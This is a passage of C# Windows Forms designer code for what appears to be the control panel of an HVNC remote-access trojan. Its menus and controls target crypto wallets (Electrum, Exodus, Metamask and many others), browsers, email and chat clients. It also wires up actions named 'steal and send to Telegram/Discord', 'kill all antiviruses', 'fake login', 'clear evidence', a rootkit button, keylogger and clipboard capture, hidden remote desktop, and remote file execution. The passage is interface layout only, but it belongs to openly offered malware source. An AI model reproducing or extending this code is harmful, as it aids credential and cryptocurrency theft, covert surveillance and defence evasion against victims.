            this.outlookToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.foxmailToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.thunderbirdToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.skypeToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.discordToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.telegramToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.dingTalkToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.authyToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.steamToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.contextMenuStrip4 = new System.Windows.Forms.ContextMenuStrip(this.components);
            this.btnChrome = new System.Windows.Forms.ToolStripMenuItem();
            this.btnEdge = new System.Windows.Forms.ToolStripMenuItem();
            this.btnFirefox = new System.Windows.Forms.ToolStripMenuItem();
            this.btnBrave = new System.Windows.Forms.ToolStripMenuItem();
            this.btnEpic = new System.Windows.Forms.ToolStripMenuItem();
            this.btnVivaldi = new System.Windows.Forms.ToolStripMenuItem();
            this.btn360 = new System.Windows.Forms.ToolStripMenuItem();
            this.btnSputnik = new System.Windows.Forms.ToolStripMenuItem();
            this.comodoToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.yandexToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.operaNeonToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.waterFoxToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.orbitumToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.atomToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.slimjetToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.contextMenuStrip5 = new System.Windows.Forms.ContextMenuStrip(this.components);
            this.msinfo32exeToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.mstscexeToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.notepadToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.controlPanelToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.powershellToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.cMDToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.explorerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.copyToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.pasteToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.fakeLoginToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.killAllAntivusesToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.timer3 = new System.Windows.Forms.Timer(this.components);
            this.contextMenuStrip6 = new System.Windows.Forms.ContextMenuStrip(this.components);
            this.stealAndSendToTelegramToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.stealAndSendToDiscordToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.stealAllWalletsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.downloadLogsViaSocketToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.clearEvidenceToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolTip1 = new System.Windows.Forms.ToolTip(this.components);
            this.timer4 = new System.Windows.Forms.Timer(this.components);
            this.contextMenuStrip7 = new System.Windows.Forms.ContextMenuStrip(this.components);
            this.startToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.stopToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.timer5 = new System.Windows.Forms.Timer(this.components);
            this.timer6 = new System.Windows.Forms.Timer(this.components);
            this.timer7 = new System.Windows.Forms.Timer(this.components);
            this.timer8 = new System.Windows.Forms.Timer(this.components);
            this.timer9 = new System.Windows.Forms.Timer(this.components);
            this.FileManagerContextMenuStrip = new System.Windows.Forms.ContextMenuStrip(this.components);
            this.networkingToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.downloadFIleToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.uploadFileToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripSeparator3 = new System.Windows.Forms.ToolStripSeparator();
            this.executeFileToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.createDirectoryToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.refreshDirectoryToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripSeparator4 = new System.Windows.Forms.ToolStripSeparator();
            this.deleteFolderFileToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.cryptographyToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.encryptFileToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.decryptFileToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.blockFileToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripSeparator5 = new System.Windows.Forms.ToolStripSeparator();
            this.searchDirectoryToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.searchForFileToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.FileManagerImageList = new System.Windows.Forms.ImageList(this.components);
            this.timer10 = new System.Windows.Forms.Timer(this.components);
            this.timer11 = new System.Windows.Forms.Timer(this.components);
            this.statusStrip1 = new System.Windows.Forms.StatusStrip();
            this.toolStripStatusLabel3 = new System.Windows.Forms.ToolStripStatusLabel();
            this.PingStatusLabel = new System.Windows.Forms.ToolStripStatusLabel();
            this.panel4 = new System.Windows.Forms.Panel();
            this.txtRes = new System.Windows.Forms.Label();
            this.txtFPS = new System.Windows.Forms.Label();
            this.VNCBox = new System.Windows.Forms.PictureBox();
            this.groupBox6 = new System.Windows.Forms.GroupBox();
            this.IntervalScroll = new System.Windows.Forms.TrackBar();
            this.QualityLabel = new System.Windows.Forms.Label();
            this.IntervalLabel = new System.Windows.Forms.Label();
            this.QualityScroll = new System.Windows.Forms.TrackBar();
            this.ShowStart = new System.Windows.Forms.Button();
            this.btnInfo = new System.Windows.Forms.Button();
            this.studioButton12 = new System.Windows.Forms.Button();
            this.button3 = new System.Windows.Forms.Button();
            this.btnClip = new System.Windows.Forms.Button();
            this.txtZilpay = new System.Windows.Forms.Label();
            this.txtRonin = new System.Windows.Forms.Label();
            this.txtExodusE = new System.Windows.Forms.Label();
            this.txtYoroi = new System.Windows.Forms.Label();
            this.label57 = new System.Windows.Forms.Label();
            this.label59 = new System.Windows.Forms.Label();
            this.label60 = new System.Windows.Forms.Label();
            this.label61 = new System.Windows.Forms.Label();
            this.txtMetamaskE = new System.Windows.Forms.Label();
            this.txtRabet = new System.Windows.Forms.Label();
            this.txtMTVS = new System.Windows.Forms.Label();
            this.txtMathE = new System.Windows.Forms.Label();
            this.txtAuvitas = new System.Windows.Forms.Label();
            this.label52 = new System.Windows.Forms.Label();
            this.txtMTV = new System.Windows.Forms.Label();
            this.label54 = new System.Windows.Forms.Label();
            this.label55 = new System.Windows.Forms.Label();
            this.label56 = new System.Windows.Forms.Label();
            this.txtETH = new System.Windows.Forms.Label();
            this.txtBitcoin = new System.Windows.Forms.Label();
            this.txtDash = new System.Windows.Forms.Label();
            this.txtLitecoin = new System.Windows.Forms.Label();
            this.txtAtom = new System.Windows.Forms.Label();
            this.txtElec = new System.Windows.Forms.Label();
            this.label44 = new System.Windows.Forms.Label();
            this.label45 = new System.Windows.Forms.Label();
            this.label47 = new System.Windows.Forms.Label();
            this.label49 = new System.Windows.Forms.Label();
            this.txtBitapp = new System.Windows.Forms.Label();
            this.txtCoin98 = new System.Windows.Forms.Label();
            this.txtEqual = new System.Windows.Forms.Label();
            this.txtMetamask = new System.Windows.Forms.Label();
            this.txtJaxx = new System.Windows.Forms.Label();
            this.txtKeplr = new System.Windows.Forms.Label();
            this.txtCrocobit = new System.Windows.Forms.Label();
            this.txtOxygen = new System.Windows.Forms.Label();
            this.txtGuarda = new System.Windows.Forms.Label();
            this.txtBytecoin = new System.Windows.Forms.Label();
            this.txtMobox = new System.Windows.Forms.Label();
            this.txtGuild = new System.Windows.Forms.Label();
            this.txtIconex = new System.Windows.Forms.Label();
            this.txtTon = new System.Windows.Forms.Label();
            this.txtCoinomi = new System.Windows.Forms.Label();
            this.txtSollet = new System.Windows.Forms.Label();
            this.txtSlope = new System.Windows.Forms.Label();
            this.txtStarcoin = new System.Windows.Forms.Label();
            this.txtPhantom = new System.Windows.Forms.Label();
            this.txtArmory = new System.Windows.Forms.Label();
            this.txtFinnie = new System.Windows.Forms.Label();
            this.txtBinance = new System.Windows.Forms.Label();
            this.txtXinPay = new System.Windows.Forms.Label();
            this.txtMath = new System.Windows.Forms.Label();
            this.txtExodus = new System.Windows.Forms.Label();
            this.txtLiquality = new System.Windows.Forms.Label();
            this.txtTron = new System.Windows.Forms.Label();
            this.txtSwash = new System.Windows.Forms.Label();
            this.txtNifty = new System.Windows.Forms.Label();
            this.txtzcash = new System.Windows.Forms.Label();
            this.label35 = new System.Windows.Forms.Label();
            this.label36 = new System.Windows.Forms.Label();
            this.label30 = new System.Windows.Forms.Label();
            this.label29 = new System.Windows.Forms.Label();
            this.label32 = new System.Windows.Forms.Label();
            this.label33 = new System.Windows.Forms.Label();
            this.label34 = new System.Windows.Forms.Label();
            this.label23 = new System.Windows.Forms.Label();
            this.label24 = new System.Windows.Forms.Label();
            this.label26 = new System.Windows.Forms.Label();
            this.label27 = new System.Windows.Forms.Label();
            this.label28 = new System.Windows.Forms.Label();
            this.label22 = new System.Windows.Forms.Label();
            this.label19 = new System.Windows.Forms.Label();
            this.label20 = new System.Windows.Forms.Label();
            this.label21 = new System.Windows.Forms.Label();
            this.label16 = new System.Windows.Forms.Label();
            this.label17 = new System.Windows.Forms.Label();
            this.label13 = new System.Windows.Forms.Label();
            this.label14 = new System.Windows.Forms.Label();
            this.label15 = new System.Windows.Forms.Label();
            this.label10 = new System.Windows.Forms.Label();
            this.label11 = new System.Windows.Forms.Label();
            this.label12 = new System.Windows.Forms.Label();
            this.label9 = new System.Windows.Forms.Label();
            this.label5 = new System.Windows.Forms.Label();
            this.label6 = new System.Windows.Forms.Label();
            this.label8 = new System.Windows.Forms.Label();
            this.label7 = new System.Windows.Forms.Label();
            this.label46 = new System.Windows.Forms.Label();
            this.label48 = new System.Windows.Forms.Label();
            this.label37 = new System.Windows.Forms.Label();
            this.txtKeyl = new System.Windows.Forms.RichTextBox();
            this.txtClip = new System.Windows.Forms.RichTextBox();
            this.studioButton13 = new System.Windows.Forms.Button();
            this.label31 = new System.Windows.Forms.Label();
            this.label25 = new System.Windows.Forms.Label();
            this.txtlongitude = new System.Windows.Forms.TextBox();
            this.txtlatitude = new System.Windows.Forms.TextBox();
            this.map = new GMap.NET.WindowsForms.GMapControl();
            this.panel3 = new System.Windows.Forms.Panel();
            this.panel1 = new System.Windows.Forms.Panel();
            this.label3 = new System.Windows.Forms.Label();
            this.label18 = new System.Windows.Forms.Label();
            this.MinBtn = new System.Windows.Forms.Button();
            this.label2 = new System.Windows.Forms.Label();
            this.ResizeLabel = new System.Windows.Forms.Label();
            this.ResizeScroll = new System.Windows.Forms.TrackBar();
            this.label4 = new System.Windows.Forms.Label();
            this.label1 = new System.Windows.Forms.Label();
            this.CloseBtn = new System.Windows.Forms.Button();
            this.RestoreMaxBtn = new System.Windows.Forms.Button();
            this.txtScreen = new System.Windows.Forms.Label();
            this.tabControl1 = new System.Windows.Forms.TabControl();
            this.tabPage6 = new System.Windows.Forms.TabPage();
            this.tabPage7 = new System.Windows.Forms.TabPage();
            this.groupBox1 = new System.Windows.Forms.GroupBox();
            this.groupBox2 = new System.Windows.Forms.GroupBox();
            this.groupBox3 = new System.Windows.Forms.GroupBox();
            this.tabPage8 = new System.Windows.Forms.TabPage();
            this.tabPage9 = new System.Windows.Forms.TabPage();
            this.tabPage10 = new System.Windows.Forms.TabPage();
            this.rjCircularPictureBox42 = new HVNC.Controls.RJCircularPictureBox();
            this.rjCircularPictureBox43 = new HVNC.Controls.RJCircularPictureBox();
            this.rjCircularPictureBox44 = new HVNC.Controls.RJCircularPictureBox();
            this.rjCircularPictureBox46 = new HVNC.Controls.RJCircularPictureBox();
            this.rjCircularPictureBox37 = new HVNC.Controls.RJCircularPictureBox();
            this.rjCircularPictureBox38 = new HVNC.Controls.RJCircularPictureBox();
            this.rjCircularPictureBox39 = new HVNC.Controls.RJCircularPictureBox();
            this.rjCircularPictureBox40 = new HVNC.Controls.RJCircularPictureBox();
            this.rjCircularPictureBox41 = new HVNC.Controls.RJCircularPictureBox();
            this.rjCircularPictureBox1 = new HVNC.Controls.RJCircularPictureBox();
            this.rjCircularPictureBox2 = new HVNC.Controls.RJCircularPictureBox();
            this.rjCircularPictureBox3 = new HVNC.Controls.RJCircularPictureBox();
            this.rjCircularPictureBox4 = new HVNC.Controls.RJCircularPictureBox();
            this.rjCircularPictureBox5 = new HVNC.Controls.RJCircularPictureBox();
            this.rjCircularPictureBox7 = new HVNC.Controls.RJCircularPictureBox();
            this.rjCircularPictureBox6 = new HVNC.Controls.RJCircularPictureBox();
            this.rjCircularPictureBox8 = new HVNC.Controls.RJCircularPictureBox();
            this.rjCircularPictureBox11 = new HVNC.Controls.RJCircularPictureBox();
            this.rjCircularPictureBox32 = new HVNC.Controls.RJCircularPictureBox();
            this.rjCircularPictureBox10 = new HVNC.Controls.RJCircularPictureBox();
            this.rjCircularPictureBox33 = new HVNC.Controls.RJCircularPictureBox();
            this.rjCircularPictureBox9 = new HVNC.Controls.RJCircularPictureBox();
            this.rjCircularPictureBox34 = new HVNC.Controls.RJCircularPictureBox();
            this.rjCircularPictureBox12 = new HVNC.Controls.RJCircularPictureBox();
            this.rjCircularPictureBox35 = new HVNC.Controls.RJCircularPictureBox();
            this.rjCircularPictureBox13 = new HVNC.Controls.RJCircularPictureBox();
            this.rjCircularPictureBox36 = new HVNC.Controls.RJCircularPictureBox();
            this.rjCircularPictureBox14 = new HVNC.Controls.RJCircularPictureBox();
            this.rjCircularPictureBox15 = new HVNC.Controls.RJCircularPictureBox();
            this.rjCircularPictureBox16 = new HVNC.Controls.RJCircularPictureBox();
            this.rjCircularPictureBox17 = new HVNC.Controls.RJCircularPictureBox();
            this.rjCircularPictureBox18 = new HVNC.Controls.RJCircularPictureBox();
            this.rjCircularPictureBox19 = new HVNC.Controls.RJCircularPictureBox();
            this.rjCircularPictureBox20 = new HVNC.Controls.RJCircularPictureBox();
            this.rjCircularPictureBox21 = new HVNC.Controls.RJCircularPictureBox();
            this.rjCircularPictureBox22 = new HVNC.Controls.RJCircularPictureBox();
            this.rjCircularPictureBox23 = new HVNC.Controls.RJCircularPictureBox();
            this.rjCircularPictureBox24 = new HVNC.Controls.RJCircularPictureBox();
            this.rjCircularPictureBox25 = new HVNC.Controls.RJCircularPictureBox();
            this.rjCircularPictureBox26 = new HVNC.Controls.RJCircularPictureBox();
            this.rjCircularPictureBox27 = new HVNC.Controls.RJCircularPictureBox();
            this.rjCircularPictureBox28 = new HVNC.Controls.RJCircularPictureBox();
            this.rjCircularPictureBox29 = new HVNC.Controls.RJCircularPictureBox();
            this.rjCircularPictureBox30 = new HVNC.Controls.RJCircularPictureBox();
            this.rjCircularPictureBox31 = new HVNC.Controls.RJCircularPictureBox();
            this.studioButton14 = new StudioButton();
            this.chkWallets = new JCS.ToggleSwitch();
            this.chkInfo = new JCS.ToggleSwitch();
            this.chkKeylog = new JCS.ToggleSwitch();
            this.chkClip = new JCS.ToggleSwitch();
            this.studioButton7 = new StudioButton();
            this.studioButton9 = new StudioButton();
            this.studioButton11 = new StudioButton();
            this.studioButton10 = new StudioButton();
            this.studioButton8 = new StudioButton();
            this.studioButton1 = new StudioButton();
            this.studioButton6 = new StudioButton();
            this.chkClone = new JCS.ToggleSwitch();
            this.btnWatcher = new StudioButton();
            this.btnElectrum = new StudioButton();
            this.btnRootkit = new StudioButton();
            this.btnKeyl = new StudioButton();
            this.studioButton2 = new StudioButton();
            this.studioButton5 = new StudioButton();
            this.studioButton4 = new StudioButton();
            this.studioButton3 = new StudioButton();
            this.contextMenuStrip1.SuspendLayout();
            this.contextMenuStrip2.SuspendLayout();
            this.contextMenuStrip3.SuspendLayout();
            this.contextMenuStrip4.SuspendLayout();
            this.contextMenuStrip5.SuspendLayout();
            this.contextMenuStrip6.SuspendLayout();
            this.contextMenuStrip7.SuspendLayout();
            this.FileManagerContextMenuStrip.SuspendLayout();
            this.statusStrip1.SuspendLayout();
            this.panel4.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)this.VNCBox).BeginInit();
            this.groupBox6.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)this.IntervalScroll).BeginInit();
            ((System.ComponentModel.ISupportInitialize)this.QualityScroll).BeginInit();
            this.panel3.SuspendLayout();
            this.panel1.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)this.ResizeScroll).BeginInit();
            this.tabControl1.SuspendLayout();
            this.tabPage6.SuspendLayout();
            this.tabPage7.SuspendLayout();
            this.tabPage8.SuspendLayout();
            this.tabPage9.SuspendLayout();
            this.tabPage10.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)this.rjCircularPictureBox42).BeginInit();
            ((System.ComponentModel.ISupportInitialize)this.rjCircularPictureBox43).BeginInit();
            ((System.ComponentModel.ISupportInitialize)this.rjCircularPictureBox44).BeginInit();
            ((System.ComponentModel.ISupportInitialize)this.rjCircularPictureBox46).BeginInit();
            ((System.ComponentModel.ISupportInitialize)this.rjCircularPictureBox37).BeginInit();
            ((System.ComponentModel.ISupportInitialize)this.rjCircularPictureBox38).BeginInit();
            ((System.ComponentModel.ISupportInitialize)this.rjCircularPictureBox39).BeginInit();
            ((System.ComponentModel.ISupportInitialize)this.rjCircularPictureBox40).BeginInit();
            ((System.ComponentModel.ISupportInitialize)this.rjCircularPictureBox41).BeginInit();
            ((System.ComponentModel.ISupportInitialize)this.rjCircularPictureBox1).BeginInit();
            ((System.ComponentModel.ISupportInitialize)this.rjCircularPictureBox2).BeginInit();
            ((System.ComponentModel.ISupportInitialize)this.rjCircularPictureBox3).BeginInit();
            ((System.ComponentModel.ISupportInitialize)this.rjCircularPictureBox4).BeginInit();
            ((System.ComponentModel.ISupportInitialize)this.rjCircularPictureBox5).BeginInit();
            ((System.ComponentModel.ISupportInitialize)this.rjCircularPictureBox7).BeginInit();
            ((System.ComponentModel.ISupportInitialize)this.rjCircularPictureBox6).BeginInit();
            ((System.ComponentModel.ISupportInitialize)this.rjCircularPictureBox8).BeginInit();
            ((System.ComponentModel.ISupportInitialize)this.rjCircularPictureBox11).BeginInit();
            ((System.ComponentModel.ISupportInitialize)this.rjCircularPictureBox32).BeginInit();
            ((System.ComponentModel.ISupportInitialize)this.rjCircularPictureBox10).BeginInit();
            ((System.ComponentModel.ISupportInitialize)this.rjCircularPictureBox33).BeginInit();
            ((System.ComponentModel.ISupportInitialize)this.rjCircularPictureBox9).BeginInit();
            ((System.ComponentModel.ISupportInitialize)this.rjCircularPictureBox34).BeginInit();
            ((System.ComponentModel.ISupportInitialize)this.rjCircularPictureBox12).BeginInit();
            ((System.ComponentModel.ISupportInitialize)this.rjCircularPictureBox35).BeginInit();
            ((System.ComponentModel.ISupportInitialize)this.rjCircularPictureBox13).BeginInit();
            ((System.ComponentModel.ISupportInitialize)this.rjCircularPictureBox36).BeginInit();
            ((System.ComponentModel.ISupportInitialize)this.rjCircularPictureBox14).BeginInit();
            ((System.ComponentModel.ISupportInitialize)this.rjCircularPictureBox15).BeginInit();
            ((System.ComponentModel.ISupportInitialize)this.rjCircularPictureBox16).BeginInit();
            ((System.ComponentModel.ISupportInitialize)this.rjCircularPictureBox17).BeginInit();
            ((System.ComponentModel.ISupportInitialize)this.rjCircularPictureBox18).BeginInit();
            ((System.ComponentModel.ISupportInitialize)this.rjCircularPictureBox19).BeginInit();
            ((System.ComponentModel.ISupportInitialize)this.rjCircularPictureBox20).BeginInit();
            ((System.ComponentModel.ISupportInitialize)this.rjCircularPictureBox21).BeginInit();
            ((System.ComponentModel.ISupportInitialize)this.rjCircularPictureBox22).BeginInit();
            ((System.ComponentModel.ISupportInitialize)this.rjCircularPictureBox23).BeginInit();
            ((System.ComponentModel.ISupportInitialize)this.rjCircularPictureBox24).BeginInit();
            ((System.ComponentModel.ISupportInitialize)this.rjCircularPictureBox25).BeginInit();
            ((System.ComponentModel.ISupportInitialize)this.rjCircularPictureBox26).BeginInit();
            ((System.ComponentModel.ISupportInitialize)this.rjCircularPictureBox27).BeginInit();
            ((System.ComponentModel.ISupportInitialize)this.rjCircularPictureBox28).BeginInit();
            ((System.ComponentModel.ISupportInitialize)this.rjCircularPictureBox29).BeginInit();
            ((System.ComponentModel.ISupportInitialize)this.rjCircularPictureBox30).BeginInit();
            ((System.ComponentModel.ISupportInitialize)this.rjCircularPictureBox31).BeginInit();
            base.SuspendLayout();
            this.timer1.Tick += new System.EventHandler(timer1_Tick);
            this.contextMenuStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[1] { this.closeToolStripMenuItem });
            this.contextMenuStrip1.Name = "contextMenuStrip1";
            this.contextMenuStrip1.Size = new System.Drawing.Size(68, 26);
            this.closeToolStripMenuItem.Name = "closeToolStripMenuItem";
            this.closeToolStripMenuItem.Size = new System.Drawing.Size(67, 22);
            this.toolStripStatusLabel1.Name = "toolStripStatusLabel1";
            this.toolStripStatusLabel1.Size = new System.Drawing.Size(44, 17);
            this.toolStripStatusLabel1.Text = "Statut :";
            this.toolStripStatusLabel2.Name = "toolStripStatusLabel2";
            this.toolStripStatusLabel2.Size = new System.Drawing.Size(26, 17);
            this.toolStripStatusLabel2.Text = "Idle";
            this.timer2.Enabled = true;
            this.timer2.Interval = 1000;
            this.timer2.Tick += new System.EventHandler(timer2_Tick);
            this.contextMenuStrip2.Items.AddRange(new System.Windows.Forms.ToolStripItem[7] { this.electrumToolStripMenuItem, this.armoryToolStripMenuItem, this.GuardaItem, this.coinomiToolStripMenuItem, this.exodusToolStripMenuItem, this.atomicToolStripMenuItem, this.jaxxToolStripMenuItem });
            this.contextMenuStrip2.Name = "contextMenuStrip1";
            this.contextMenuStrip2.Size = new System.Drawing.Size(122, 158);
            this.electrumToolStripMenuItem.Name = "electrumToolStripMenuItem";
            this.electrumToolStripMenuItem.Size = new System.Drawing.Size(121, 22);
            this.electrumToolStripMenuItem.Text = "Electrum";
            this.electrumToolStripMenuItem.Click += new System.EventHandler(electrumToolStripMenuItem_Click);
            this.armoryToolStripMenuItem.Name = "armoryToolStripMenuItem";
            this.armoryToolStripMenuItem.Size = new System.Drawing.Size(121, 22);
            this.armoryToolStripMenuItem.Text = "Armory";
            this.armoryToolStripMenuItem.Click += new System.EventHandler(armoryToolStripMenuItem_Click);
            this.GuardaItem.Name = "GuardaItem";
            this.GuardaItem.Size = new System.Drawing.Size(121, 22);
            this.GuardaItem.Text = "Guarda";
            this.GuardaItem.Click += new System.EventHandler(GuardaItem_Click);
            this.coinomiToolStripMenuItem.Name = "coinomiToolStripMenuItem";
            this.coinomiToolStripMenuItem.Size = new System.Drawing.Size(121, 22);
            this.coinomiToolStripMenuItem.Text = "Coinomi";
            this.coinomiToolStripMenuItem.Click += new System.EventHandler(coinomiToolStripMenuItem_Click);
            this.exodusToolStripMenuItem.Name = "exodusToolStripMenuItem";
            this.exodusToolStripMenuItem.Size = new System.Drawing.Size(121, 22);
            this.exodusToolStripMenuItem.Text = "Exodus";
            this.exodusToolStripMenuItem.Click += new System.EventHandler(exodusToolStripMenuItem_Click);
            this.atomicToolStripMenuItem.Name = "atomicToolStripMenuItem";
            this.atomicToolStripMenuItem.Size = new System.Drawing.Size(121, 22);
            this.atomicToolStripMenuItem.Text = "Atomic";
            this.atomicToolStripMenuItem.Click += new System.EventHandler(atomicToolStripMenuItem_Click);
            this.jaxxToolStripMenuItem.Name = "jaxxToolStripMenuItem";
            this.jaxxToolStripMenuItem.Size = new System.Drawing.Size(121, 22);
            this.jaxxToolStripMenuItem.Text = "Jaxx";
            this.jaxxToolStripMenuItem.Click += new System.EventHandler(jaxxToolStripMenuItem_Click);
            this.contextMenuStrip3.Items.AddRange(new System.Windows.Forms.ToolStripItem[9] { this.outlookToolStripMenuItem, this.foxmailToolStripMenuItem, this.thunderbirdToolStripMenuItem, this.skypeToolStripMenuItem, this.discordToolStripMenuItem, this.telegramToolStripMenuItem, this.dingTalkToolStripMenuItem, this.authyToolStripMenuItem, this.steamToolStripMenuItem });
            this.contextMenuStrip3.Name = "contextMenuStrip1";
            this.contextMenuStrip3.Size = new System.Drawing.Size(140, 202);
            this.outlookToolStripMenuItem.Name = "outlookToolStripMenuItem";
            this.outlookToolStripMenuItem.Size = new System.Drawing.Size(139, 22);
            this.outlookToolStripMenuItem.Text = "Outlook";
            this.outlookToolStripMenuItem.Click += new System.EventHandler(outlookToolStripMenuItem_Click_1);
            this.foxmailToolStripMenuItem.Name = "foxmailToolStripMenuItem";
            this.foxmailToolStripMenuItem.Size = new System.Drawing.Size(139, 22);
            this.foxmailToolStripMenuItem.Text = "Foxmail";
            this.foxmailToolStripMenuItem.Click += new System.EventHandler(foxmailToolStripMenuItem_Click_1);
            this.thunderbirdToolStripMenuItem.Name = "thunderbirdToolStripMenuItem";
            this.thunderbirdToolStripMenuItem.Size = new System.Drawing.Size(139, 22);
            this.thunderbirdToolStripMenuItem.Text = "Thunderbird";
            this.thunderbirdToolStripMenuItem.Click += new System.EventHandler(thunderbirdToolStripMenuItem_Click_1);
            this.skypeToolStripMenuItem.Name = "skypeToolStripMenuItem";
            this.skypeToolStripMenuItem.Size = new System.Drawing.Size(139, 22);
            this.skypeToolStripMenuItem.Text = "Skype";
            this.skypeToolStripMenuItem.Click += new System.EventHandler(skypeToolStripMenuItem_Click);
            this.discordToolStripMenuItem.Name = "discordToolStripMenuItem";
            this.discordToolStripMenuItem.Size = new System.Drawing.Size(139, 22);
            this.discordToolStripMenuItem.Text = "Discord";
            this.discordToolStripMenuItem.Click += new System.EventHandler(discordToolStripMenuItem_Click);
            this.telegramToolStripMenuItem.Name = "telegramToolStripMenuItem";
            this.telegramToolStripMenuItem.Size = new System.Drawing.Size(139, 22);
            this.telegramToolStripMenuItem.Text = "Telegram";
            this.telegramToolStripMenuItem.Click += new System.EventHandler(telegramToolStripMenuItem_Click);
            this.dingTalkToolStripMenuItem.Name = "dingTalkToolStripMenuItem";
            this.dingTalkToolStripMenuItem.Size = new System.Drawing.Size(139, 22);
            this.dingTalkToolStripMenuItem.Text = "DingTalk";
            this.dingTalkToolStripMenuItem.Click += new System.EventHandler(dingTalkToolStripMenuItem_Click);
            this.authyToolStripMenuItem.Name = "authyToolStripMenuItem";
            this.authyToolStripMenuItem.Size = new System.Drawing.Size(139, 22);
            this.authyToolStripMenuItem.Text = "Authy";
            this.authyToolStripMenuItem.Visible = false;
            this.steamToolStripMenuItem.Name = "steamToolStripMenuItem";
            this.steamToolStripMenuItem.Size = new System.Drawing.Size(139, 22);
            this.steamToolStripMenuItem.Text = "Steam";
            this.steamToolStripMenuItem.Visible = false;
            this.contextMenuStrip4.Items.AddRange(new System.Windows.Forms.ToolStripItem[15]
            {
                this.btnChrome, this.btnEdge, this.btnFirefox, this.btnBrave, this.btnEpic, this.btnVivaldi, this.btn360, this.btnSputnik, this.comodoToolStripMenuItem, this.yandexToolStripMenuItem,
                this.operaNeonToolStripMenuItem, this.waterFoxToolStripMenuItem, this.orbitumToolStripMenuItem, this.atomToolStripMenuItem, this.slimjetToolStripMenuItem
            });
            this.contextMenuStrip4.Name = "contextMenuStrip1";
            this.contextMenuStrip4.Size = new System.Drawing.Size(139, 334);
            this.btnChrome.Name = "btnChrome";
            this.btnChrome.Size = new System.Drawing.Size(138, 22);
            this.btnChrome.Text = "Chrome";
            this.btnChrome.Click += new System.EventHandler(btnChrome_Click);
            this.btnEdge.Name = "btnEdge";
            this.btnEdge.Size = new System.Drawing.Size(138, 22);
            this.btnEdge.Text = "Edge";
            this.btnEdge.Click += new System.EventHandler(btnEdge_Click);
            this.btnFirefox.Name = "btnFirefox";
            this.btnFirefox.Size = new System.Drawing.Size(138, 22);
            this.btnFirefox.Text = "Firefox";
            this.btnFirefox.Click += new System.EventHandler(btnFirefox_Click);
            this.btnBrave.Name = "btnBrave";
            this.btnBrave.Size = new System.Drawing.Size(138, 22);
            this.btnBrave.Text = "Brave";
            this.btnBrave.Click += new System.EventHandler(btnBrave_Click);
            this.btnEpic.Name = "btnEpic";
            this.btnEpic.Size = new System.Drawing.Size(138, 22);
            this.btnEpic.Text = "Epic";
            this.btnEpic.Click += new System.EventHandler(btnOpera_Click);
            this.btnVivaldi.Name = "btnVivaldi";
            this.btnVivaldi.Size = new System.Drawing.Size(138, 22);
            this.btnVivaldi.Text = "Vivaldi";
            this.btnVivaldi.Click += new System.EventHandler(btnVivaldi_Click);
            this.btn360.Name = "btn360";
            this.btn360.Size = new System.Drawing.Size(138, 22);
            this.btn360.Text = "360";
            this.btn360.Click += new System.EventHandler(btn360_Click);
            this.btnSputnik.Name = "btnSputnik";
            this.btnSputnik.Size = new System.Drawing.Size(138, 22);
            this.btnSputnik.Text = "Sputnik";
            this.btnSputnik.Click += new System.EventHandler(btnSputnik_Click);
            this.comodoToolStripMenuItem.Name = "comodoToolStripMenuItem";
            this.comodoToolStripMenuItem.Size = new System.Drawing.Size(138, 22);
            this.comodoToolStripMenuItem.Text = "Comodo";
